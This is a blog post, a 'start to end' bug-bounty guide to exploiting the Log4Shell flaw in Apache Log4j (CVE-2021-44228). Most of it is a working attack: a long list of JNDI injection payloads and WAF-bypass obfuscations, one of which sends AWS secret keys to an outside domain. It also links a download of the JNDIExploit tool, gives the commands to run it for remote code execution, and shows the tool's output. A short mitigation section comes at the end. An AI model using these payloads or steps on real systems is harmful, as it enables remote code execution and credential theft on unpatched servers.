<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>CVE-2021-44228 - Log4J Start to End Guide Books</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="index, follow, max-snippet:-1, max-video-preview:-1, max-image-preview:large">
    <link rel="canonical" href="https://akashpatil.me/log4j-book.html">
    <meta property="og:url" content="https://akashpatil.me/log4j-book.html"/>
    <meta property="og:title" content="CVE-2021-44228 - Log4J Start to End Guide Books"/>
    <meta property="og:description" content="CVE-2021-44228 - Log4J Start to End Guide Book."/>
    <meta property="og:site_name" content="akashpatil.me"/>
    <meta property="og:image" content="https://github.com/akashrpatil/akashpatil.github.io/blob/main/img/blog/LOG4J.jpg"/>
    <meta property="og:image:secure_url" content="https://github.com/akashrpatil/akashpatil.github.io/blob/main/img/blog/LOG4J.jpg">
    <meta property="og:image:alt" content="CVE-2021-44228">
    <meta name="twitter:title" content="CVE-2021-44228 - Log4J Start to End Guide Book - akashpatil.me">                                                                                                                            
    <meta name="twitter:description" content="CVE-2021-44228 - Log4J Start to End Guide Books">
    <meta name="twitter:site" content="@skypatil98">     
    <meta name="twitter:image" content="https://github.com/akashrpatil/akashpatil.github.io/blob/main/img/blog/LOG4J.jpg">
                                                   
    <link rel="icon" type="image/x-icon" href="img/favi.png">
    <!-- Template Google Fonts -->
    <link href="https://fonts.googleapis.com/css?family=Poppins:400,400i,500,500i,600,600i,700,700i,800,800i,900,900i" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,400i,600,600i,700" rel="stylesheet">

    <!-- Template CSS Files -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/preloader.min.css" rel="stylesheet">
    <link href="css/circle.css" rel="stylesheet">
    <link href="css/font-awesome.min.css" rel="stylesheet">
    <link href="css/fm.revealator.jquery.min.css" rel="stylesheet">
    <link href="css/style.css" rel="stylesheet">

    <!-- CSS Skin File -->
    <link href="css/skins/yellow.css" rel="stylesheet">

    <!-- Live Style Switcher - demo only -->
    <link rel="alternate stylesheet" type="text/css" title="blue" href="css/skins/blue.css" />
    <link rel="alternate stylesheet" type="text/css" title="green" href="css/skins/green.css" />
    <link rel="alternate stylesheet" type="text/css" title="yellow" href="css/skins/yellow.css" />
    <link rel="alternate stylesheet" type="text/css" title="blueviolet" href="css/skins/blueviolet.css" />
    <link rel="alternate stylesheet" type="text/css" title="goldenrod" href="css/skins/goldenrod.css" />
    <link rel="alternate stylesheet" type="text/css" title="magenta" href="css/skins/magenta.css" />
    <link rel="alternate stylesheet" type="text/css" title="orange" href="css/skins/orange.css" />
    <link rel="alternate stylesheet" type="text/css" title="purple" href="css/skins/purple.css" />
    <link rel="alternate stylesheet" type="text/css" title="red" href="css/skins/red.css" />
    <link rel="alternate stylesheet" type="text/css" title="yellowgreen" href="css/skins/yellowgreen.css" />
    <link rel="stylesheet" type="text/css" href="css/styleswitcher.css" />

    <!-- Modernizr JS File -->
    <script src="js/modernizr.custom.js"></script>
    
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9055502209907299"
     crossorigin="anonymous"></script>
    
    <link rel="stylesheet"
      href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.3.1/build/styles/default.min.css">
    
</head>

<body class="blog-post">
<!-- Live Style Switcher Starts - demo only -->
<div id="switcher" class="">
    <div class="content-switcher">
        <h4>STYLE SWITCHER</h4>
        <ul>
            <li>
                <a href="#" onclick="setActiveStyleSheet('purple');" title="purple" class="color"><img src="img/styleswitcher/purple.png" alt="purple"/></a>
            </li>
            <li>
                <a href="#" onclick="setActiveStyleSheet('red');" title="red" class="color"><img src="img/styleswitcher/red.png" alt="red"/></a>
            </li>
            <li>
                <a href="#" onclick="setActiveStyleSheet('blueviolet');" title="blueviolet" class="color"><img src="img/styleswitcher/blueviolet.png" alt="blueviolet"/></a>
            </li>
            <li>
                <a href="#" onclick="setActiveStyleSheet('blue');" title="blue" class="color"><img src="img/styleswitcher/blue.png" alt="blue"/></a>
            </li>
            <li>
                <a href="#" onclick="setActiveStyleSheet('goldenrod');" title="goldenrod" class="color"><img src="img/styleswitcher/goldenrod.png" alt="goldenrod"/></a>
            </li>
            <li>
                <a href="#" onclick="setActiveStyleSheet('magenta');" title="magenta" class="color"><img src="img/styleswitcher/magenta.png" alt="magenta"/></a>
            </li>
            <li>
                <a href="#" onclick="setActiveStyleSheet('yellowgreen');" title="yellowgreen" class="color"><img src="img/styleswitcher/yellowgreen.png" alt="yellowgreen"/></a>
            </li>
            <li>
                <a href="#" onclick="setActiveStyleSheet('orange');" title="orange" class="color"><img src="img/styleswitcher/orange.png" alt="orange"/></a>
            </li>
            <li>
                <a href="#" onclick="setActiveStyleSheet('green');" title="green" class="color"><img src="img/styleswitcher/green.png" alt="green"/></a>
            </li>
            <li>
                <a href="#" onclick="setActiveStyleSheet('yellow');" title="yellow" class="color"><img src="img/styleswitcher/yellow.png" alt="yellow"/></a>
            </li>
        </ul>

       <div id="hideSwitcher">&times;</div>
    </div>
</div>
<div id="showSwitcher" class="styleSecondColor"><i class="fa fa-cog fa-spin"></i></div>
<!-- Live Style Switcher Ends - demo only -->
<!-- Header Starts -->
<header class="header" id="navbar-collapse-toggle">
    <!-- Fixed Navigation Starts -->
    <ul class="icon-menu d-none d-lg-block revealator-slideup revealator-once revealator-delay1">
        <li class="icon-box">
            <i class="fa fa-home"></i>
            <a href="index.html">
                <h2>Home</h2>
            </a>
        </li>
        <li class="icon-box">
            <i class="fa fa-user"></i>
            <a href="about.html">
                <h2>About</h2>
            </a>
        </li>
        <li class="icon-box">
            <i class="fa fa-briefcase"></i>
            <a href="portfolio.html">
                <h2>Portfolio</h2>
            </a>
        </li>
        <li class="icon-box">
            <i class="fa fa-envelope-open"></i>
            <a href="contact.html">
                <h2>Contact</h2>
            </a>
        </li>
        <li class="icon-box active">
            <i class="fa fa-comments"></i>
            <a href="blog.html">
                <h2>Blog</h2>
            </a>
        </li>
    </ul>
    <!-- Fixed Navigation Ends -->
    <!-- Mobile Menu Starts -->
    <nav role="navigation" class="d-block d-lg-none">
        <div id="menuToggle">
            <input type="checkbox" />
            <span></span>
            <span></span>
            <span></span>
            <ul class="list-unstyled" id="menu">
                <li><a href="index.html"><i class="fa fa-home"></i><span>Home</span></a></li>
                <li><a href="about.html"><i class="fa fa-user"></i><span>About</span></a></li>
                <li><a href="portfolio.html"><i class="fa fa-folder-open"></i><span>Portfolio</span></a></li>
                <li><a href="contact.html"><i class="fa fa-envelope-open"></i><span>Contact</span></a></li>
                <li class="active"><a href="blog.html"><i class="fa fa-comments"></i><span>Blog</span></a></li>
            </ul>
        </div>
    </nav>
    <!-- Mobile Menu Ends -->
</header>
<!-- Header Ends -->
<!-- Page Title Starts -->
<section class="title-section text-left text-sm-center revealator-slideup revealator-once revealator-delay1">
    <h1>my <span>blog</span></h1>
    <span class="title-bg">posts</span>
</section>
<!-- Page Title Ends -->
<!-- Main Content Starts -->
<section class="main-content revealator-slideup revealator-once revealator-delay1">
    <div class="container">
        <div class="row">
            <!-- Article Starts -->
            <article class="col-12">
                <!-- Meta Starts -->
                <div class="meta open-sans-font">
                    <span><i class="fa fa-user"></i>Akash Patil</span>
                    <span class="date"><i class="fa fa-calendar"></i> 21 Dec 2021</span>
                    <span><i class="fa fa-tags"></i>#log4j #log4jshell #cve-2021-44228 #bugbounty #bugbountytips</span>
                </div>
                <!-- Meta Ends -->
                <!-- Article Content Starts -->
                <h1 class="text-uppercase text-capitalize">CVE-2021-44228 - Log4J Start to End Guide Book</h1>
                <img src="img/blog/LOG4J.jpg" class="img-fluid" alt="Blog image"/>
                <div class="blog-excerpt open-sans-font pb-5">
                    <h2>1. Introduction</h2>
                    <p>The Log4J vulnerability is triggered by attackers inserting a JNDI lookup in a header field (likely to be logged) linking to a malicious server. After Log4j logs this string, the server is queried and gives directory information leading to the download and execution of a malicious java data class
                    Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. Affected versions are 2.0 <= Apache log4j <= 2.14.1
                    </p>
                        <img src="img/blog/logj mindamap.jpeg" class="img-fluid" alt="JNDI-ATTACK"/>
                    <p>
                      LOG4SHELL is a Remote Code Execution vulnerability in the Apache Log4j library, a Java-based logging tool widely used in applications around the world. This vulnerability allows an attacker who can control log messages to execute arbitrary code loaded from attacker-controlled servers — and we anticipate that most apps using the Log4j library will meet this condition.
                    </p>
                     
                    <div align="center"> 
                    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9055502209907299" crossorigin="anonymous"></script>
                    <ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-9055502209907299" data-ad-slot="3713241114"></ins>
                   <script>
                  (adsbygoogle = window.adsbygoogle || []).push({});
                   </script>
                    </div><br />
                    
                   <h2>2. How it works ( Detection )</h2>
                     <p> 
1. An attacker inserts the JNDI lookup/payload in a anywhere of request that is likely to be logged. (for instance: `${jndi:ldap://domain.com/j}`)<br>
2. The payload is passed to log4j for logging.<br>
3. Log4j interpolates the string and queries the malicious ldap server.<br>
4. The ldap server responds with directory information that contains the malicious java class.<br>
5. Java deserializes or download the malicious java class and execute it.<br>
                    </p>
                 <h2>3. Simple DNS Log Monitor Services</h2>
 <p> 
1. - <a href="https://canarytokens.org/generate">[canarytokens]</a><br>
2. - <a href="http://ceye.io/">[ceye]</a><br>
3. - <a href="https://log.xn--9tr.com/">[dnslog]</a><br>
4. - <a href="https://requestbin.net/">[requestbin]</a><br>
5. - <a href="https://portswigger.net/burp/documentation/collaborator">[burp collaborator]</a><br>
6. - <a href="https://www.joshmcguigan.com/blog/run-your-own-dns-servers/">[run your own dns servers]</a><br>
                    </p><br>
                   <h2>4. Steps to reproduce</h2> 
                    <p>
1. Find the target.<br>
2. Create DNS Service for Callback<br><br>
<img src="img/blog/step1.jpg" class="img-fluid" alt="step1"/>
3. Fire the payload into input field and Find out any field which may be logged. For example, 
   the endpoint which you are accessing, User-Agent, Referrer, things which you search, something which you submit in some form, etc.<a href="https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/http-request-headers/http-request-headers-fields-large.txt">Headers.</a><br>
 <img src="img/blog/step2.jpg" class="img-fluid" alt="step2"/><br>
4. If you get the ping back then you good to go.Before that read this awesome writeup about pingbacks <a href="https://infosecwriteups.com/facts-to-clear-about-log4j-for-bug-bounty-hunters-f58e04eb025">Pingback Doubts</a><br><br>
<img src="img/blog/step3.jpg" class="img-fluid" alt="step3"/> <br>
5. For getting Java version, we’ll use this one: <code>${jndi:ldap://z${sys:java.version}.xyz.burpcollaborator.net/rce}</code><br>
</p><br>
                          
<h2>Payloads & WAF Bypasses</h2>
<pre><code>Want to know the Java version running on the target?<br>
${jndi:ldap://${sys:java.version}.collaborator.com}
${env:JAVA_VERSION}
${sys:java.version}
${hostName}
${sys:java.vendor}
${jndi:ldap://domain.com/j}
${jndi:ldap:/domain.com/a}
${jndi:dns:/domain.com}
${jndi:dns://domain.com/j}
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://domain.com/j}
${${::-j}ndi:rmi://domain.com/j}
${jndi:rmi://domainldap.com/j}
${${lower:jndi}:${lower:rmi}://domain.com/j}
${${lower:${lower:jndi}}:${lower:rmi}://domain.com/j}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://domain.com/j}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://domain.com/j}
${jndi:${lower:l}${lower:d}a${lower:p}://domain.com}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//domain.com/a}
jn${env::-}di:
jn${date:}di${date:':'}
j${k8s:k5:-ND}i${sd:k5:-:}
j${main:\k5:-Nd}i${spring:k5:-:}
j${sys:k5:-nD}${lower:i${web:k5:-:}}
j${::-nD}i${::-:}
j${EnV:K5:-nD}i:
j${loWer:Nd}i${uPper::}<br>

=======
<b>Bypass WAF</b>

1. ${jndi:ldap://127.0.0.1:1389/ badClassName}

2. ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}

3. ${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}

4. ${jndi:rmi://adsasd.asdasd.asdasd}

5. ${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.mydogsbutt.com}<br>
=========

If you're filtering on "ldap", "jndi", or the ${lower:x} method, I have bad news for you:

${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}<br>

=====
<b>Log4j Cloudflare bypass :</b>
${jndi:dns://aeutbj.example.com/ext}
${jndi:${lower:l}${lower:d}a${lower:p}://example.com/
https://pbs.twimg.com/media/FGVKwNYXIAMQ5nH?format=jpg&name=small <br>

Just bypassed AWS WAF for log4j jndi injection: @11xuxx
${j${k8s:k5:-ND}i${sd:k5:-:}ldap://mydogsbutt.com:1389/o}
==
Non-Exploitable:
${jndi:ldap://${k8s:podName}.domain.com/j}
${jndi:ldap://${k8s:imageId}.domain.com/j}
${jndi:ldap://${k8s:imageName}.domain.com/j}
${jndi:ldap://${log4j:configLocation}.domain.com/j}
${jndi:ldap://${log4j:configParentLocation}.domain.com/j}
${jndi:ldap://${spring:spring.application.name}.domain.com/j}
${jndi:ldap://${main:myString}.domain.com/j}
${jndi:ldap://${main:0}.domain.com/j}
${jndi:ldap://${main:1}.domain.com/j}
${jndi:ldap://${main:2}.domain.com/j}
${jndi:ldap://${main:3}.domain.com/j}
${jndi:ldap://${main:4}.domain.com/j}
${jndi:ldap://${main:bar}.domain.com/j}
</code></pre>
                                                       
<h2>5.<u>Exploitaion</h2>
<p> 
1. Before RCE, Make sure and try to get the Java version and os name of the target. For getting os name, we’ll use this payload: ${jndi:ldap://${sys:os.name}.xyz.burpcollaborator.net/a}
2. Now download this zip file in your instance and unzip it.<a href="https://anonfiles.com/xd07G204v9/JNDIExploit.v1.2_zip">Here</a><br>
3. Start the LDAP server<br>
    <code>java -jar JNDIExploit-1.2-SNAPSHOT.jar -i YOUR_PUBLIC_IP -p 8888</code>
4. We just need to inject the payload.<code>${jndi:ldap://YOUR_PUBLIC_IP:1389/Basic/Command/Base64/BASE64_ENCODED_COMMAND}</code><br>
5. we’ll encode our command in base64:<br>    
   <img src="img/blog/step4.jpg" class="img-fluid" alt="step4"/> <br>
6. You can see the hit like below:<code>
    [+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 8888...
[+] Received LDAP Query: Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo
[+] Paylaod: command
[+] Command: touch /tmp/pwned

[+] Sending LDAP ResourceRef result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo with basic remote reference payload
[+] Send LDAP reference result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo redirecting to http://192.168.1.143:8888/Exploitjkk87OnvOH.class
[+] New HTTP Request From /192.168.1.143:50119  /Exploitjkk87OnvOH.class
[+] Receive ClassRequest: Exploitjkk87OnvOH.class
[+] Response Code: 200
</code><br>
    
<h2>6.<u>Mitigation</h2>
1. SPOT VULNERABLE APPLICATIONS<br>

Ask admin/system team to run a search/grep command on all servers to spot any file with the name “log4j2”, Then check if it is a vulnerable version or not”<br>

2. PERMANENT MITIGATION<br>

Version 2.15.0 of log4j has been released without the vulnerability. log4j-core.jar is available on Apache Log4j page below, You
can download it and update your system<br>
    
3. TEMPORARY MITIGATION<br>

    “Add <code>“log4j.format.msg.nolookups=true”</code> to the global configuration of your server/web applications”<br>

    <h2>References & Credits</h2>
                    <p>Thanks you so much</p>
                    Features:-
                     <ul>
                     <li>Good Nesting controls</li>
                      <li>Unlimited pages</li>
                      <li>You can share your page with anyone</li>
                      <li>Provides API (Good for automation</li>
                      <li>Easy to use and free</li>
                      <li>Easily Accessible</li>
                    </ul><br />
                     
                <div id="hyvor-talk-view"></div>
                <script type="text/javascript">
                var HYVOR_TALK_WEBSITE = 5972;
                var HYVOR_TALK_CONFIG = {
                url: false,
                id: false
                    };
                </script>
                <script async type="text/javascript" src="//talk.hyvor.com/web-api/embed.js"></script>
                <!-- Article Content Ends -->
            </article>
            <!-- Article Ends -->
        </div>
    </div>
</section>
<!-- Template JS Files -->
<script src="js/jquery-3.5.0.min.js"></script>
<script src="js/styleswitcher.js"></script>
<script src="js/preloader.min.js"></script>
<script src="js/fm.revealator.jquery.min.js"></script>
<script src="js/imagesloaded.pkgd.min.js"></script>
<script src="js/masonry.pkgd.min.js"></script>
<script src="js/classie.js"></script>
<script src="js/cbpGridGallery.js"></script>
<script src="js/jquery.hoverdir.js"></script>
<script src="js/popper.min.js"></script>
<script src="js/bootstrap.js"></script>
<script src="js/custom.js"></script>
<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.3.1/build/highlight.min.js"></script>
    <script>
        hljs.initHighlightingOnLoad();
    </script>

</body>


</html>
